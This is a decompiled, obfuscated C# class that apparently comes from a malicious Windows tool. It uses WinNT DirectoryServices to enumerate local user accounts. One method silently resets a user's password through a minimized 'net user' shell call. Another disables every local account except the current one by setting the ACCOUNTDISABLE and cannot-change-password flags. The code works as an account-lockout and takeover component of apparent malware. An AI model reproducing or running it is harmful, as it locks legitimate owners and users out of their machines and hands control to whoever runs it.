using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns4;

internal class Class17
{
	private static string string_0 = "success";

	private static string string_1 = "failed";

	private static string string_2 = "Can not found the specified user";

	private static string string_3 = "Can not found the specified group";

	private static List<string> list_0 = smethod_5(Environment.MachineName);

	private static string string_4 = Environment.UserName;

	public static void smethod_0(string string_5, string string_6)
	{
		Interaction.Shell("net user " + string_5 + " " + string_6, (AppWinStyle)2, false, -1);
	}

	public static void smethod_1()
	{
		foreach (string item in list_0)
		{
			if (Operators.CompareString(item, string_4, false) != 0)
			{
				smethod_2(item, bool_0: false);
			}
		}
	}

	public unsafe static string smethod_2(string string_5, bool bool_0)
	{
		void* ptr = stackalloc byte[20];
		DirectoryEntry val = smethod_4();
		string message = string_1;
		if (val != null)
		{
			if (smethod_3(string_5))
			{
				try
				{
					DirectoryEntry val2 = val.get_Children().Find(string_5, "user");
					*(int*)((byte*)ptr + 4) = 512;
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 8) = 64;
					*(int*)ptr = 65536;
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4) | *(int*)ptr | *(int*)((byte*)ptr + 8);
					if (!bool_0)
					{
						*(int*)((byte*)ptr + 16) = 2;
						*(int*)((byte*)ptr + 12) |= *(int*)((byte*)ptr + 16);
					}
					val2.Invoke("Put", new object[2]
					{
						"userFlags",
						*(int*)((byte*)ptr + 12)
					});
					val2.CommitChanges();
					message = string_0;
					val2.Close();
					((Component)(object)val2).Dispose();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					message = ex2.Message;
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				message = string_2;
			}
		}
		val.Close();
		((Component)(object)val).Dispose();
		return message;
	}

	private static bool smethod_3(string string_5)
	{
		DirectoryEntry val = smethod_4();
		bool result = false;
		if (val != null)
		{
			try
			{
				if (val.get_Children().Find(string_5, "user") != null)
				{
					result = true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
			}
		}
		val.Close();
		((Component)(object)val).Dispose();
		return result;
	}

	private static DirectoryEntry smethod_4()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		DirectoryEntry val = null;
		try
		{
			string text = "WinNT://" + Environment.MachineName + ",computer";
			return new DirectoryEntry(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			val = null;
			ProjectData.ClearProjectError();
			return val;
		}
	}

	public static List<string> smethod_5(string string_5)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		DirectoryEntry val = new DirectoryEntry("WinNT://" + string_5);
		List<string> list = new List<string>();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val.get_Children().GetEnumerator();
			while (enumerator.MoveNext())
			{
				DirectoryEntry val2 = (DirectoryEntry)enumerator.Current;
				if (Operators.CompareString(val2.get_SchemaClassName(), "User", false) == 0)
				{
					list.Add(val2.get_Name());
				}
			}
			return list;
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}
}
